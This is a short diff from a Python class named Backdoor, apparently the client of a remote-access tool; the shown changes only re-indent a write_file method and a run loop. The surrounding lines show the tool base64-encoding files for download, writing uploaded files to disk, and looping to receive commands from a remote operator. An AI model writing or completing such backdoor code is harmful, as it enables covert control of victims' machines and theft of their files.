@@ -34,12 +34,12 @@ class Backdoor:
 		with open(path, "rb") as file: # treat file as read + binary
 			return base64.b64encode(file.read())
       
-  def write_file(self, path, content):
+  	def write_file(self, path, content):
 		with open(path, "wb") as file:
 			file.write(base64.b64decode(content))
 			return "[+] upload successful!"
 
-  def run(self): 
+ 	def run(self): 
 		while True:
 			command = self.reliable_receive()
 			try:
